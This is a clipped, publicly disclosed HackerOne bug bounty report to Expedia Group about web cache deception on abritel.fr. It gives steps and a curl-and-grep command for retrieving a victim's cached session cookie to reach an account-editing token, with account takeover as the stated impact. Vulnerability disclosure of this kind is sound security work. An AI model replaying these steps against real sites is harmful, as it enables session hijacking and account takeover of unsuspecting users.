---
title: "Expedia Group Bug Bounty disclosed on HackerOne: Cache Deception..."
Type: Report
Source: https://hackerone.com/reports/1698316
date: 2026-02-05
tags:
  - Clippings
  - Report
  - Bugs/cache-deception
Finished: true
Cover: https://profile-photos.hackerone-user-content.com/variants/000/033/992/0e4b72ebdbd50d8f7a75bc55f7c2c42ec7bad759_original.jpg/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586
Site: HackerOne
---
## Highlights


---
## Full Page Content

## Summary:

I'm able to extract user's session (HASESSIONV3) as it is disclosed in a cacheable page, allowing me to access the `ha.crumb` token located in `/traveler/profile/edit`

**Code** • 503 Bytes

## Steps To Reproduce:

Victim Steps:

1->Visit [https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis](https://www.abritel.fr/search/keywords:soissons-france-\(xss\)/minNightlyPrice/x.jpeg?triagethis)

Attacker Steps:

1->Visit the same URL using any other browser or do

`curl 'https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis' --compressed | grep -i 'HASESSIONV3'`


![](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/icmnncutwci7uun4gb8zwc9s5w9h?response-content-disposition=attachment%3B%20filename%3D%222022-09-12.png%22%3B%20filename%2A%3DUTF-8%27%272022-09-12.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2YSOLJ7M%2F20260205%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260205T104526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGIaCXVzLXdlc3QtMiJGMEQCIB3Yzi1IP9GGOxRlHfsLtFVYXwt8IWzZOol9nzXUZ7QrAiB%2BEBuP7cGRU2NvTv5kCqD5Lwliczu2kSHBRjn8ugggpSqyBQgqEAMaDDAxMzYxOTI3NDg0OSIMdrqWubi7D9TksuDwKo8FtX1clMkYpltUGFjcBS8KKXikgmEGk0aoa9N4HVOOLe2c%2FPSG0oFqQ4WWwxcLApxMdL6Oz38yS8U8BIcuB%2BXNBMG%2Byj%2BYUKMciAeabJNVwCCof9LajUrD4kBauAJ0SfG4BKV0YivEtGPbtc6R52NPKawzfOIwkNVLeoz%2BqdicUxXzyy6zHtDo7b9%2F2cG41n%2FXLL56RPo2OtF%2FXEWwSLOUGxQ0oUfH69BERnyCU1f3RdKDhds1nuVVdXf4g1A1vFSjBLisY5AuBvvvq4%2F648QQ%2B8%2F6qVXs%2BigoxqtOjoESHFpkdD%2FDyBn5eRBbwEP6xAlryqVbW8OpPdpMlumlcLwpvyJZBaAlBz06PqkuZfm2RN2oMk%2FCfvOPNhwcK9uKgJMXlZR1toxogGprSo7BVqrJUiWlX9dhnqkIpvuIDLHxZp9yCsfnWy5EzQlrtJ1dSnpZIH1ySub1uXqcGQ1SJBfs1grZylDt2E3bwfVIztUFm5z%2FYu6WRBoe6r6ADGYMQBt3JCNsoluwtL1om4aVxwXZohOqiONDL3AYTY9Y4SspXJoGiLWeW5XEfrI8KG3BzUVb91jgdYIB4vBuL9Eibce3rCW0BDT0aW6eAjEWj9SCy4DNCkSje%2FkfopmerqZKH0CO1soGRkvSsOKQeXFt1H0q72KccjYHObUsBLHR%2FZdOveZu46OPVd0yVt%2FItEbrCxCB9bD5JlfK5rWcwDVcBdxYQFJUNNoc10eG0jenZJSn%2BZ4Vh2hi7wBNnuHjE%2BsYMp62Q71lTz4%2Bf2DWhmiLvRxc7OwtGPGz8486yFGv8K2ovf%2B26SFI8iPRG6xGZBqSbO6D7solMjM2lu6vVO0YtIUSVH6RN04LV4axYXjv5CdIsTD2wZHMBjqyAY%2FHjidDrdI6TRuge1pwswc563NXCXkDm%2BHLhorQJK%2FLQ8OP%2BRzByiZOtXcj4AFEDttR4GjRXRnHSkR6GlxbLcmLBIDfYMcX9zyDRcvz4H6Uglv4fPDdxyHiwFEabV6BMiWxuE4kBe5FYHjSFmdDvFA7bqvgR3%2FaNyFz2vnnFPPLrsfMGJ2xPDYxuM8NTdO7vJ%2FcOjsP2lwt1iaVOihtgNloAZKZPQkYxIHPbDxaanlUxuc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fe05b06da46ca7108893e0784e4f540b7cecb507a2459423e746f855512c5bcd)

2-> use the token

**Code** • 503 Bytes

and look for the `ha.crumb` variable in the response

## Recommended Remediation Steps

1. Add cache rules for certain all cacheable extensions

## Impact

Account Takeover

**1 attachment**

- F1923081: [2022-09-12.png](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/icmnncutwci7uun4gb8zwc9s5w9h?response-content-disposition=attachment%3B%20filename%3D%222022-09-12.png%22%3B%20filename%2A%3DUTF-8%27%272022-09-12.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2YSOLJ7M%2F20260205%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260205T104526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGIaCXVzLXdlc3QtMiJGMEQCIB3Yzi1IP9GGOxRlHfsLtFVYXwt8IWzZOol9nzXUZ7QrAiB%2BEBuP7cGRU2NvTv5kCqD5Lwliczu2kSHBRjn8ugggpSqyBQgqEAMaDDAxMzYxOTI3NDg0OSIMdrqWubi7D9TksuDwKo8FtX1clMkYpltUGFjcBS8KKXikgmEGk0aoa9N4HVOOLe2c%2FPSG0oFqQ4WWwxcLApxMdL6Oz38yS8U8BIcuB%2BXNBMG%2Byj%2BYUKMciAeabJNVwCCof9LajUrD4kBauAJ0SfG4BKV0YivEtGPbtc6R52NPKawzfOIwkNVLeoz%2BqdicUxXzyy6zHtDo7b9%2F2cG41n%2FXLL56RPo2OtF%2FXEWwSLOUGxQ0oUfH69BERnyCU1f3RdKDhds1nuVVdXf4g1A1vFSjBLisY5AuBvvvq4%2F648QQ%2B8%2F6qVXs%2BigoxqtOjoESHFpkdD%2FDyBn5eRBbwEP6xAlryqVbW8OpPdpMlumlcLwpvyJZBaAlBz06PqkuZfm2RN2oMk%2FCfvOPNhwcK9uKgJMXlZR1toxogGprSo7BVqrJUiWlX9dhnqkIpvuIDLHxZp9yCsfnWy5EzQlrtJ1dSnpZIH1ySub1uXqcGQ1SJBfs1grZylDt2E3bwfVIztUFm5z%2FYu6WRBoe6r6ADGYMQBt3JCNsoluwtL1om4aVxwXZohOqiONDL3AYTY9Y4SspXJoGiLWeW5XEfrI8KG3BzUVb91jgdYIB4vBuL9Eibce3rCW0BDT0aW6eAjEWj9SCy4DNCkSje%2FkfopmerqZKH0CO1soGRkvSsOKQeXFt1H0q72KccjYHObUsBLHR%2FZdOveZu46OPVd0yVt%2FItEbrCxCB9bD5JlfK5rWcwDVcBdxYQFJUNNoc10eG0jenZJSn%2BZ4Vh2hi7wBNnuHjE%2BsYMp62Q71lTz4%2Bf2DWhmiLvRxc7OwtGPGz8486yFGv8K2ovf%2B26SFI8iPRG6xGZBqSbO6D7solMjM2lu6vVO0YtIUSVH6RN04LV4axYXjv5CdIsTD2wZHMBjqyAY%2FHjidDrdI6TRuge1pwswc563NXCXkDm%2BHLhorQJK%2FLQ8OP%2BRzByiZOtXcj4AFEDttR4GjRXRnHSkR6GlxbLcmLBIDfYMcX9zyDRcvz4H6Uglv4fPDdxyHiwFEabV6BMiWxuE4kBe5FYHjSFmdDvFA7bqvgR3%2FaNyFz2vnnFPPLrsfMGJ2xPDYxuM8NTdO7vJ%2FcOjsP2lwt1iaVOihtgNloAZKZPQkYxIHPbDxaanlUxuc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fe05b06da46ca7108893e0784e4f540b7cecb507a2459423e746f855512c5bcd "2022-09-12.png")

